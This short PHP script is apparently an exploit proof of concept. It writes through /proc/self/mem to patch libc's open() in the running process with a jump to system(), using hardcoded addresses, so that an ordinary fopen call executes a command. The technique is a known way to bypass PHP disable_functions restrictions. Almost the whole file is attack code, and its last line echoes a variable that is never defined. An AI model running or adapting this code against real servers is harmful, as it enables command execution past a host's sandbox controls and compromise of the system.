<?php

$jmp_system = "\xE9\x2B\xB0\xF5\xFF";
$system_addr = 0x46640;
$open_addr = 0xeb610;
$libc_base = 0x7fc535662000;

$file = fopen("/proc/self/mem", "wb");
fseek($file, $open_addr + $libc_base);
fwrite($file, $jmp_system, strlen($jmp_system));

fopen("/bin/ls", "r");

echo base64_encode($data);
?>